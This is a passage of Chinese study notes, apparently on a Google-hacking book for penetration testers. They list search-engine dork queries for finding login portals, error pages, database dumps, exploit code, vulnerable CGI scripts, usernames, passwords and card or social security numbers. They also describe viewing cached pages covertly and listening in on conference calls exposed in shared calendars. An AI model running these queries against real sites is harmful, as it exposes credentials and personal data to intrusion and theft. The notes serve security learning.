<p>  <strong>一些较为敏感的office文档：</strong></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4985.jpeg" alt="0"></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4984.jpeg" alt="0"></p>
<p>  <strong>4.4 数据库挖掘</strong></p>
<ul>
<li>登陆入口，尤其是软件制造商提供的默认入口，是可以很容易就搜索到的 eg：login welcome copyright statements</li>
<li>位于服务器端和客户端的软件都有帮助文件， 这些文件会泄露关于应用程序配置和用法的信息</li>
<li>不同的错误消息的内容都能用来剖析目标</li>
<li>数据库转储已证明是所有数据库的发现中泄露信息最多的，因为他们包括完整的或者部分的数据哭内容，可以通过数据库转储的头部字符搜索来得到， eg: “#Dumping data for table”</li>
</ul>
<p>  <strong>4.4.1 登陆入口：</strong></p>
<ul>
<li><p>搜索登陆入口 <strong>eg: inurl: admin | login</strong>  等</p>
</li>
<li><p>下面是一些搜索的例子</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4994.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4995.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.2 帮助文件</strong></p>
<ul>
<li><p>其可能泄露机器名，用户名和明文口令</p>
</li>
<li><p>下面是一些帮助文件的搜索</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5008.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5009.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.3 错误信息：</strong></p>
<ul>
<li><p>错误信息会泄露更多关于服务器上可能存在的漏洞的危险信息</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5016.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5018.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5017.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5015.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.4 数据库转储：</strong></p>
<ul>
<li><p>数据库的任意格式的输出都可以看做是数据库的转储 它可以泄露出很多信息</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5028.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.5 实际的数据库文件：</strong></p>
<ul>
<li><p>对于数据库存储文件来说 Google只适用于用一个特定的文件名或扩展名的文件来表示数据库</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5035.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5034.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.6 网站链接：</strong></p>
<ul>
<li><strong><a target="_blank" rel="noopener" href="http://www.filext.com">www.filext.com</a></strong>        一个关于文件扩展名信息的不错的资源。</li>
<li><strong><a target="_blank" rel="noopener" href="http://desktop.google.com">http://desktop.google.com</a></strong>        Google桌面搜索应用程序</li>
<li><strong>http”//johnny.ihackstuff.com</strong>        Google hacking数据库的主页，在其中你可以找到更多的和本章中列出的那些搜索相近的搜索</li>
</ul>
<p>  <strong>4.7 一些感想</strong></p>
<ul>
<li>如果防止下载 .INC文件或者将扩展名改为.PHP 隐藏其中的内容</li>
<li>如果想要防止这方面的信息泄露，应该模拟一次信息的渗透测试来修改你不希望的出现的东西，甚至可以放一些文件来误导攻击者</li>
<li>对于附录网站敏感信息或者绝对路径的文件，应该放在一些无法read的目录或隐藏</li>
</ul>
<p>  <strong>第五章 Google在信息收集框架中扮演的角色</strong></p>
<p>  <strong>5.1 简介</strong></p>
<ul>
<li>黑客实际上是一种心境以及一种思考方式，而不是一种物理属性</li>
</ul>
<ol>
<li>因为他们想了解大多数人所不了解的</li>
<li>知识就是力量</li>
</ol>
<p>  <strong>5.2 自动搜索原则</strong></p>
<ul>
<li>确定原始搜索关键字</li>
<li>扩展 搜索关键字</li>
<li>从数据源获取数据</li>
<li>解析数据</li>
<li>在后期过程中，将数据处理为信息</li>
</ul>
<p>  <strong>5.2.1 原始搜索关键字</strong></p>
<ul>
<li>清晰的定义目标大概算是所有搜索中最不相同的部分了，好的搜索不可能得到一个不清晰的目标。在进行自动化搜索时，手动搜索中的原则也同样适用：无用的信息输入，无用信息输出。</li>
</ul>
<p>  <strong>5.2.2 扩展搜索关键字</strong></p>
<ul>
<li>扩展搜索关键字是人类的天性，自动化搜索真正的本领就在于它能思考人类工作过程并且能够将改过程翻译成某种算法</li>
</ul>
<p>  <strong>（对于自动化查找则和字典相同去匹配各种邮箱来找到你所使用的东西）</strong></p>
<ol>
<li><p>E-mail地址</p>
</li>
<li><p>电话号码</p>
</li>
<li><p>人</p>
</li>
<li><p>获取大量结果</p>
</li>
<li><p>更多组合</p>
</li>
<li><p>使用“特殊的”操作符</p>
<p>eg：</p>
</li>
</ol>
<ul>
<li>filetype:ppt site:www.****.gov</li>
<li>filetype:doc site:www.****.gov</li>
<li>filetype:xls site:www.****.gov</li>
<li>filetype:pdf site:www.****.gov</li>
</ul>
<p>  <strong>5.2.3 从数据源获取数据</strong></p>
<p>  <strong>1.自行抓取——请求并接受响应</strong></p>
<ul>
<li>这是获取结果的另一种灵活的方式。你完全可以控制整个过程，并且可以进行诸如设置结果数量这类工作——使用应用编程接口（Applocation Programming Interface, API）你一旦进行了该工作，你的顾虑就被完全打消了，并且会开始着手调节参数</li>
</ul>
<p>  <strong>NETCAT</strong></p>
<ul>
<li><strong>人们称Netcat是TCP/Internet Protocol (IP)的瑞士军刀。对于黑白两道而言，它都是一个极有的工具；从漏洞利用获取反解的shell（黑帽）到帮助网络管理员分析协议（白帽）。</strong></li>
</ul>
<p>  <strong>2. 自行抓取——解析结果</strong></p>
<ul>
<li>可以用netcat抓取结果并自动做结果解析</li>
</ul>
<p>  <strong>3.Dapper</strong></p>
<ul>
<li>Dapper站点（<strong><a target="_blank" rel="noopener" href="http://www.dapper.net">www.dapper.net</a></strong>）支持用户创建一种他们称为Dapper的东西。这些Dapp是很小的程序，可以从任何站点抓取信息，并将这些抓取的数据以几乎任何一种方式传递 （例如，XML、CSV、RSS等）</li>
</ul>
<p>  <strong>4.Aura/EvilAPI</strong></p>
<ul>
<li>一种能拦截Google API调用并返回简单对象存取协议（Simple Object Access Protocol, SOAP） XML的应用程序——基于仍旧在使用的API的应用程序不需要进行任何改动。</li>
</ul>
<p>  <strong>5.使用其他搜索引擎</strong></p>
<ul>
<li>除了Google外，世界上还有很多搜索引擎！MSN引擎也支持API</li>
</ul>
<p>  <strong>API</strong>：API就是操作系统留给应用程序的一个调用接口，应用程序通过调用操作系统的 API 而使操作系统去执行应用程序的命令（动作）。</p>
<p>  <strong>5.2.4解析数据</strong></p>
<ol>
<li>解析E-mail地址</li>
<li>域和子域</li>
<li>电话号码</li>
</ol>
<p>  <strong>5.2.5 后期处理</strong></p>
<ol>
<li>按相关性对结果进行分类</li>
<li>非摘要内容</li>
<li>呈现结果</li>
</ol>
<p>  <strong>5.3 搜索关键字</strong></p>
<p>  <strong>5.3.1 在Web上收集</strong></p>
<ul>
<li>你可以从中搜索到其他人的搜索关键字的泄露站点会突然出现，一旦你找到了一些有趣的东西，你将会看到此人执行的所有的其他的搜索</li>
</ul>
<p>  <strong>5.3.2 自行收集</strong></p>
<ul>
<li>当你搜索某些资料时，查询都会定位到Google计算机。你每次在Google上执行搜索时，他们都会查看你是否通过了一个cookie。如果没有会指示你的浏览器设置一个 </li>
</ul>
<p>  <strong>//  然后可以使用burfsuite去搞一些事情</strong></p>
<ul>
<li><strong>隐藏 甜言蜜语：</strong> 假设你在运行一个代号为“Sookha”的超级机密项目。没有人知道这个项目的名称。如果某人想去Google上查找单词Sookha，那么你应该在不让搜索者察觉你所了解的事实情况下获知。<strong>你能做的就是注册一个使用Sookha作为关键字的关键字广告。</strong></li>
</ul>
<p>  <strong>5.4一些感想</strong></p>
<ul>
<li>应该建立一个自己的字典脚本来对于一些查询</li>
<li>学习一些python脚本来为你的自动搜索做一些事情</li>
<li>对于一个隐晦的不想让他人通过Google在搜索出来的东西可以以该名字作为一个广告的关键字</li>
</ul>
<p>  <strong>第六章 搜索漏洞利用与查找目标</strong></p>
<p>  <strong>6.1 简介</strong></p>
<ul>
<li>漏洞利用（exploit）代码时黑客使用的一种工具。他们设计用来洞察一个目标，大部分黑客都有许多可以随意支配的漏洞利用。而大部分的漏洞利用在某段时间内时不公开的，不过他们最终会公布，发布出来，而我们正式利用这一点来进行Google搜索 找到一些可以使用的和一些可以被攻击的目标</li>
</ul>
<p>  <strong>6.2搜索漏洞利用代码</strong></p>
<ul>
<li><p>可以通过关注那些常见的字符串，例如exploit或者vulnerablility，来搜索公开的漏洞利用站点。如果想让结果更为精确，可以给查询附上filetype操作符，以查询以特定程序设计语言所编写的漏洞利用  eg:    filetype:c c |  filetype:c exploit |  php</p>
</li>
<li><p>即可以使用filetype指定文件扩展名，也可以使用源代码中的常见字符串，例如“include ”，来查找漏洞利用代码</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5996.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5998.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>6.3 Google代码搜索</strong></p>
<ul>
<li><p>Google代码搜索，可以用来搜索程序内部的代码，但是它也可以用来搜索导致漏洞的编程错误</p>
</li>
<li><p>除了允许查询包括强大的正则表达式外，代码搜索还引入了特殊的搜索符，如下</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6000.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6002.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>6.4 搜索恶意软件和可执行文件</strong></p>
<ul>
<li>Google不止会抓取，还会分析二进制文件或者可执行文件</li>
<li>Google的二进制搜索功能可以用来剖析可执行文件，但是它也可以用来搜索Web上的可用恶意软件</li>
</ul>
<p>  <strong>6.5 搜索易受攻击的目标</strong></p>
<ul>
<li>攻击者可以利用软件制造商提供的应用程序的演示程序中出现的字符串来搜索潜在的目标</li>
<li>攻击者也可以下载并选择性安装易受攻击的产品，从而在应用程序显示的字符串中查找特殊的字符串</li>
<li>不管字符串是如何获得的，它都能够很容易地转换成Google查询，彻底缩短了在公开漏洞公告之后，访问人员花在加固站点安全上的时间</li>
</ul>
<p>  <strong>6.5.1 利用演示页面搜索目标</strong></p>
<ul>
<li>通过演示页面来获取web对应的一些版本信息在来进行查询</li>
</ul>
<p>  <strong>6.5.2 利用源代码搜索目标</strong></p>
<ul>
<li>同样的原来在网页上下载对应的网站源代码来找到网站的信息，针对各种信息在做出对应的查询</li>
</ul>
<p>  <strong>6.5.3 利用CGI扫描搜索目标</strong></p>
<ul>
<li><p>利用CGI扫描器    一个CGI扫描器可以在一个数据文件中列出易受攻击的文件和目录</p>
</li>
<li><p>eg： inurl:/cgi-bin/userreg.cgi        |    filetype:cgi inurl:userreg.cgi</p>
<p>​    </p>
</li>
</ul>
<p>  <strong>6.6 网站链接</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.sensepost.com/research/wikto/">www.sensepost.com/research/wikto/</a>    Wikto,一个很棒的Google和web扫描器</li>
<li><a target="_blank" rel="noopener" href="http://www.cirt.net/code/nikto.shtml">www.cirt.net/code/nikto.shtml</a> Nikto, 一很棒的Web扫描器</li>
<li><a target="_blank" rel="noopener" href="http://packetstormsecurity.com">http://packetstormsecurity.com</a>    一个很棒的工具和漏洞利用站点</li>
</ul>
<p>  <strong>6.10 一些想法</strong></p>
<ul>
<li>这是因为它能够使用strip=1参数来显示缓存页面</li>
</ul>
<p>  <strong>第7章 简单有效的安全性搜索</strong></p>
<p>  <strong>7.1 简介</strong></p>
<ul>
<li>针对安全方面的工作而言，我们来看看在安全性评估中相当有效的10个搜索，但这仅仅是作为你的前10位列表的基础。</li>
</ul>
<p>  <strong>7.1.1 site</strong></p>
<ul>
<li>site操作符擅长从Google所收集的内容中提取与目标有关的信息</li>
<li>这个操作符常用于和其他本章中提到的查询组合使用，以对某一目标实现精确搜索</li>
<li>site搜索也可以用来收集关于目标主机或服务器的信息</li>
<li>eg：        <strong>site:nytimes.com-site:**</strong><a target="_blank" rel="noopener" href="http://www.nytimes.com">www.nytimes.com</a>**</li>
</ul>
<p>  <strong>7.1.2 intitle:index.of</strong> </p>
<ul>
<li>针对<strong>Apache</strong>风格的目录列表的通用搜索</li>
<li>目录列表能够给攻击者提供又价值的信息</li>
</ul>
<p>  <strong>7.1.3 error | warning</strong></p>
<ul>
<li><strong>(“for more information” | “not found”) (error | warning)</strong> 查询就返回了很多条有趣的结果</li>
<li>错误消息在每种坏境下都会泄露出很多信息</li>
<li>在某些情况下，警告文本能够提供目标所使用的代码内部的重要信息</li>
</ul>
<p>  <strong>7.1.4 login | logon</strong></p>
<ul>
<li>登陆 <strong>(login)</strong> 入口就是一个网站的”前门” 可以查询出来</li>
<li>这个查询可以高效地搜索出登陆人口</li>
<li>它也可以用来获取用户名以及解决问题的步骤</li>
</ul>
<p>  <strong>7.1.5 username | userid | employee.ID | “your username is”</strong></p>
<ul>
<li>有许多不同的方法用来从一个目标系统中获取用户名，即使在大多数的认证机制中，用户名都是不太重要的一半，但是至少应对它进行最低限度的保护，以防止外人获取</li>
<li><strong>一种获取用户名的最通用的搜索</strong></li>
<li>当这个查询不能获取用户名时，其周围的上下文也能泄露攻击者可以用于后续攻击行为的信息</li>
</ul>
<p>  <strong>7.1.6 passworl | passcode | “your passcode is”</strong></p>
<ul>
<li>这个查询反映了<strong>password</strong>的常见的方法</li>
<li>这个查询能够泄露描述登陆步骤、口令修改步骤以及目标所用的口令策略的文档。对于搜索有关电话会议的信息而言，特别是在<strong>Google</strong>日历搜索中，<strong>passcode</strong>特别有用</li>
<li>一般性的搜索是没有什么用的但是如果加上site搜索就变得不寻常了</li>
</ul>
<p>  <strong>7.1.7 admin | administrator</strong></p>
<ul>
<li>该查询用两个最常用的术语来表示网站的所有者或者维护者，可以用来暴露程序上的信息(例如”contact your administrator”)，甚至是管理登陆入口</li>
</ul>
<p>  <strong>7.1.8 -ext”:html -ext:html -ext:shtml -ext:asp -ext:php</strong></p>
<ul>
<li>当把这个查询和site操作符组合使用时，能够剔除最常见的文件，而暴露更有趣的文档</li>
<li>该查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件累心</li>
</ul>
<p>  <strong>7.1.9 inurl:temp | inurl:tmp | inurl:backup | inurl:bak</strong></p>
<ul>
<li>查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件，而暴露出更有趣的文档</li>
</ul>
<p>  <strong>7.1.10 intranet | help.desk</strong></p>
<ul>
<li>这个查询用来搜索内部网络站点（这些站点应该收到保护以防止外部人员访问）以及服务台联系信息和操作步骤</li>
</ul>
<p>  <strong>7.2 一些想法</strong></p>
<ul>
<li>规模较大的查询列表中的大多数搜索都是非常特殊的，它们只针对很少的一部分互联网站点。虽然这些特殊查询的效果极佳，但是一般最好还是保存一个规模较小的强大的搜索列表，以在评估中灵活地创造出丰富的搜索，尤其是当你用常规方法感到无计可施时更为有用</li>
</ul>
<p>  <strong>第8章 跟踪搜索Web服务器、登陆入口和网络硬件</strong></p>
<p>  <strong>8.1 简介</strong></p>
<ul>
<li>通常认为，渗透测试人员也是专业的黑客，因为它们本质上通过攻入客户的网路来查找、记录并且最终帮助客户解决系统或者网络中的安全缺陷的</li>
</ul>
<p>  <strong>8.2 定位并分析Web服务器</strong></p>
<ul>
<li>目录列表和默认的服务器生产的错误消息可以提供一些关于服务器的信息。即使这些信息可以通过直接连接到服务器来得到，但是一名拥有针对特定版本的软件的漏洞利用程序的攻击者会使用Google查询来搜索相应的目标，而这些Google查询都是针对这类信息设计的</li>
<li>攻击者尤其会关注操作系统，Web服务器软件的版本和名称、默认的配置，有漏洞的脚本，或者这些因素的任意组合</li>
<li>Google查询更为隐蔽而且也给攻击者和目标之前提供了某种程度的隔离</li>
<li>服务器和应用程序错误消息暴露了大量的信息，从软件的版本和补丁级别到源代码片段以及关于系统进程和程序的信息，错误消息是最被低估的信息泄露途径之一</li>
</ul>
<p>  <strong>8.2.1 目录列表</strong></p>
<ul>
<li>对与服务器的目录列表的程序“server at “Apache/2.0.52” ” 查找具有Apache 2.0.52 server标记的目录列表的服务器</li>
</ul>
<p>  <strong>8.2.2 Web服务器软件的错误信息</strong></p>
<ul>
<li>对于Microsoft IIS 默认情况下在IIS 5和IIS 6在服务器遇到某种问题时，会显示相应的静态的HTTP/1.1错误消息，这些错误页面默认保存在%SYSTEMROOT%\help\iishelp\common目录</li>
<li>对于服务器报错，搜一些错误信息 httpd.conf        bottom.html</li>
<li>可以使用一些基本的shell命令，我们就能吧错误页面的标题与可能出现在错误页面上的文本分离出来        <strong>//grep -h -r “Content-language: en” -A 10 | grep -A5 “TITLE” | grep -v virtual</strong></li>
</ul>
<p>  <strong>8.2.3 应用软件错误消息</strong></p>
<ul>
<li>查询”Fatal error: Call to undefined function” -reply -the -next 能查找到ASP错误消息</li>
<li>查询 intext: “warning: Failed opening “ include_path 可以找到一些常见的错误，许多错误都会泄露路径名和文件名</li>
</ul>
<p>  <strong>8.2.4 默认页面</strong></p>
<ul>
<li><p>查找特殊类型的服务器或者Web软件的方法时搜索默认的Web页面。大多数的软件，包括Web服务器软件自身，都带有一个或多个默认或测试页面。这些页面可以让管理员方便地测试Web服务器或者应用程序的安装。</p>
</li>
<li><p><strong>一些查找特定服务器的查询</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6832.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6830.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6833.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6831.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.2.5 默认文档</strong></p>
<ul>
<li><p>Web服务器软件通常会附带一些手册和文档，它们位于Web目录中。攻击者可以利用这种文档对Web软件进行剖析或者搜索。</p>
</li>
<li><p>大部分一些文档会透露着一些服务器什么的默认设置甚至一些管理员的默认账户密码</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6884.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.2.6 示例程序</strong></p>
<ul>
<li><p>Web软件除了附带文档和手册之外，一个软件包通常还包含一些默认的应用程序。这些默认的应用程序，例如默认的Web页面，可以帮助演示软件的功能，作为开发者的起点，提供可以用作学习工具的实例函数和代码。</p>
</li>
<li><p>例如Microsoft Index Server的内容查找可以允许Web访问者搜索整个网站的内容。在某些情况下，这个查询页面能够查找到没有被其他任何页面链接的页面或者包含敏感信息的页面</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6902.png" alt="0"></p>
</li>
<li><p>你可以使用这些缓存页面与&amp;strip=1选项一道来匿名查看页面，这可以让信息收集工作远离服务器管理员的监视</p>
</li>
<li><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6911.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6915.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.3 定位登陆入口</strong></p>
<ul>
<li><p>登陆入口会吸引那些正搜索特定类型软件的攻击者。另外，登陆入口也可以作为信息收集攻击的起点。因为大多数登陆入口都是设计成对用户友好的，给新用户提供帮助文档和操作步骤的链接。管理登陆入口和远程股管理工具有时更加危险，尤其是当它们没有被正确的配置时</p>
</li>
<li><p>一些登陆入口，类似allinurl:” exchange/logon.asp” 可能会提供大量关于服务器的信息</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6938.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6942.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6944.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6947.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6949.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6951.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6954.png" alt="0"></p>
</li>
</ul>
<p>  <strong>使用并且查找各种Web工具</strong></p>
<ul>
<li><p>虽然Google强大且灵活，但它并不是无所不能的。有时候，如果不用Google反而更简单。当不使用Google来执行类似与WHOIS查询，“pings”，traceroute以及端口扫描等任务时，更为简单方便。</p>
</li>
<li><p>NQT网络查询工具（Network Query Tool）。<a target="_blank" rel="noopener" href="http://www.shipmail.gr/index.php">http://www.shipmail.gr/index.php</a></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6978.png" alt="0"></p>
</li>
<li><p>默认的NQT安装允许任何网络用户执行IP主机名和地址查询，DNS查询，WHOIS查询，端口测试与traceroute。NQT是一个基于Web的程序，意思是说任何能够访问该页面的用户都可以对任意目标执行这些功能。器服务器会掩盖用户的真实地址。如果使用一个匿名代理服务器，则可以进一步的隐藏用户的真实身份        //NQT程序也打接受远程的POST请求</p>
</li>
</ul>
<p>  <strong>8.4 瞄准使用Web的网络设备</strong></p>
<ul>
<li>各种网络设备都可以用Google查询搜索到。对某些攻击者而言，这些设备不仅知识满足他们技术上的好奇，许多由Web链接了的设备配置不当，而且安全审计人员通常会忽视那些可信的设备。网络摄像头就是一种被忽视的设备，它能够给攻击者提供目标的内部情况，即使只有相当少的一部分目标安装了网络摄像头。当网络打印机被攻陷时，会泄露大量的敏感信息，尤其是对攻击者而言，他们可以查看打印作业和网络信息。</li>
<li>许多网络设备都预安装一个Web接口以雨荨管理员查询设备的状态或者通过Web浏览器来改变设备的设置</li>
</ul>
<p>  <strong>8.5 查找各种网络报告</strong></p>
<ul>
<li>网络文档和状态报告，它们能够让外部人员访问所有的信息，从网络上的IP地址到完整的，可用的网络图表    </li>
<li>来自这些信息可以用来帮助创建网络映射</li>
</ul>
<p>  <strong>8.6 查找网络硬件</strong></p>
<ul>
<li><p>一个连接到网络的设备通常都具有某种Web页面。如果该设备连接到了互联网上，斌且曾经在一个到该设备的Web页面的链接，那么很有可能该页面存在于Google的数据库之中，等待某个灵巧的查询找到它</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7046.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.7 总结即一些感想</strong></p>
<ul>
<li>攻击者使用Google由多种目的。攻击者可能拥有一个针对某个Web软件特定版本的漏洞利用程序</li>
<li>目录列表可以提供设备上所用的软件版本信息。</li>
<li>服务器报错也会泄露大量的信息</li>
<li>登陆入口也是攻击的一个手段</li>
<li>总的来说还是一个固定不变的思想有输入就有攻击，你有反应我就可以作事情，查询一些以有的东西来帮助我做一些事情</li>
</ul>
<p>  <strong>第九章 用户名、口令和其他秘密信息</strong></p>
<p>  <strong>9.1 简介</strong></p>
<ul>
<li>这一章的内容不是关于在评估过程中查找敏感数据的，而是关于为了搜索这些数据，那些“坏人”可能会做什么。这一章所提到的例子通常都代表了最常见的安全问题。黑客在每次攻击时都要瞄准这些信息。为了对抗这类攻击者。我们必须十分明确这种攻击会造成的最坏的可能。但是，我们也不用过于了解这些最坏的可能。请不要告诉那些有坏信息的人一些他们尚不知道的观念</li>
</ul>
<p>  <strong>9.2搜索用户名</strong></p>
<ul>
<li><p>大多数认证系统都是使用用户名和口令来保护信息。为了达到突破这类保护的“前门”的目的，你需要判断用户以及口令。</p>
</li>
<li><p>能够在许多地方找到用户名，某些时候，可能需要挖掘文档或E-mail目录</p>
</li>
<li><p>一个想“your username is” 这样简单的查询都能有效地搜索用户名</p>
</li>
<li><p>在一些帮助文档中包括了一些默认的用户和密码</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7108.png" alt="0"></p>
</li>
<li><p>搜索已知的文件名来查找是否存在信息</p>
</li>
<li><p>在Windows注册表保存了各种认证信息，包括用户名和口令，虽然不可能（很少）在Web中搜索到可用的，导出了的Windows注册表文件，但是这都是一种思想</p>
</li>
<li><p>可以在公共目录中查找多次，最终会得到接近于包含所有用户信息的列表</p>
</li>
</ul>
<p>  <strong>9.3搜索口令</strong></p>
<ul>
<li><p>口令数据是渗透测试中的“圣杯”之一，它应该收到保护。遗憾的是。有许多可以用来在网络上搜索口令查询Google查询的例子</p>
</li>
<li><p>一个类似于“Your password” forgot这样简单的查询能够找到提供忘记口令回复机制的页面</p>
</li>
<li><p>intext:(password | passcod | pass) intext:(username | userid | user)是另外一种针对口令信息的通用搜索 </p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7137.png" alt="0"></p>
</li>
<li><p>下面是各种语言password的翻译文</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7142.png" alt="0"></p>
</li>
</ul>
<p>  <strong>9.4 搜索信用卡账号和社保号码等</strong></p>
<ul>
<li>随着互联网上不可靠的零售商越来越多，出现如此多的信用卡欺骗现象也就没有什么可奇怪的了。并不是只有这些小规模的零售商会受到黑客的攻击。这些年来，成败上千个大新企业的财务数据库也受到了攻击，有些受害公司还是技术比较好并且也非常主义防止攻击的公司</li>
<li>大多书情况下，包含这些账号的页面都不是从在线零售商或者电子商务网站”泄露出去的“，而很有可能是网络钓鱼欺骗结果。网络钓鱼欺骗是通过电话或者E-mail欺骗用户的个人信息</li>
<li>甚至一些不负责任的新闻渠道泄漏了能够查找这些信息的功能查询，还可以通过搜索特定的文件扩展名来查找</li>
</ul>
<p>  <strong>9.4.1 社保账号</strong></p>
<ul>
<li>社保号码和其他铭感数据也可以很容易地通过Google查找到，所用的技术和搜索信用卡账号的技术相同</li>
</ul>
<p>  <strong>9.4.2 个人财务数据</strong></p>
<ul>
<li><p>在某些情况下，公布个人消息的责任在于钓鱼欺骗，在其他一些情况下，侵犯个人隐私就要归咎于那写攻击网上零售商的黑客了。随这当今社会个人电脑数量的快速增长，差不多有上百种个人财务程序供用户选择使用。许多这种程序都会创建带有特定文件扩展名的数据文件</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7185.png" alt="0"></p>
</li>
</ul>
<p>  <strong>9.5搜索其他有利可图的信息</strong></p>
<ul>
<li><p>Google能找到的但是很难归类的数据。这些数据包括地址簿、聊天日志文件、以及网络漏洞报告等，这些网上的敏感数据都是很有价值的。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7194.png" alt="0"></p>
</li>
<li><p>Nessus安全扫描工具的输出。Nessus可以在<a target="_blank" rel="noopener" href="http://www.nessus.org上获得。这个很棒的开源工具能够对目标执行一系列的安全测试，并报告各种可能的漏洞">www.nessus.org上获得。这个很棒的开源工具能够对目标执行一系列的安全测试，并报告各种可能的漏洞</a></p>
</li>
</ul>
<p>  <strong>9.6 总结</strong></p>
<ul>
<li>不要犯任何错误，因为在网上存在各种敏感的数据，而且Google能够找到这些数据。除非你能够给出恰当的查询，否则可搜索的信息机会没有任何限制。用户名、口令、信用卡账号、社保号码和个人财务数据这些信息都在可搜索的范围内。</li>
<li>一个泄露的口令就能够提供关于用于其他系统上的口令的线索。大多数策略都进制这种口令共享，但是这种限制通常很难执行</li>
</ul>
<p>  <strong>第十章 hacking Google 服务</strong></p>
<p>  <strong>10.1 AJAX Search API</strong></p>
<ul>
<li>AJAX Search API是AJAX前端的主要的Google服务。该项服务有意取代旧的SOAP搜索服务，而SOAP搜索服务的支持在不久前已经被废止了。AJAX Search API被认为是比SOAP服务更强大的一个服务，并且更容易使用。</li>
<li>该服务的主要目标是使外部网能够寄存Google供给的技术，这些技术提供了位域寄存在Web站点内、外的搜索工具，并且可以是视频剪辑、地图、博客、自定义搜索引擎等等中的一个</li>
</ul>
<p>  <strong>10.1.1 嵌入式Google AJAX Search API</strong></p>
<ul>
<li><p>Google AJAX Search API 设计为嵌入到外部页内。这使得服务箱单更有用，因为我们可以指导自定义界面来获得更好的对Google底层结构的访问。为了着手启用Google AJAX Search API 你需要理解JavaScrippt和AJAX编程以及你要自行生成的API密钥。</p>
</li>
<li><p>XSS和AJAX蠕虫</p>
</li>
<li><p>该技术可以通过XSS/AJAX蠕虫来实现目标搜索并且利用目标来获取有用的信息，因此要确保将来的繁殖。XSS/AJAX蠕虫通常都在源域中繁殖和传播。这是因为JavaScript没有执行跨站点请求的能力。本章提到的该技术语序蠕虫绕过JacaScript的限制，并且可以访问在线的其他资源</p>
</li>
</ul>
<p>  <strong>10.2 Calendar</strong></p>
<ul>
<li>Google calendar 是一个功能强大的日历管理应用程序，它支持类似日历共享、邀请创建、搜索以及日历发布。该服务也可以于Google Mail （Gmail）结合起来，并且可以通过移动设备来访问。</li>
<li>因为单个用户可以维护其他用户可能更也很感兴趣的时间列表以及入理。所以calendar共享是一个非常有用的功能。</li>
<li>共享的日历，通常。甚至是执行那些最基本的搜索时，都完全有可能无意间发现那些可以执行恶意目的的铭感信息</li>
<li>例如泄露了几个预定的电话会议。注意，会议电话号码和访问代码也列了出来，你可通过对于会议的秘密听取来获得你想要的信息，或者用一些简单的账户密码的搜索来找到一些你想要的信息</li>
</ul>
<p>  <strong>10.3 Blogger和Google的Blog Search</strong></p>
<ul>
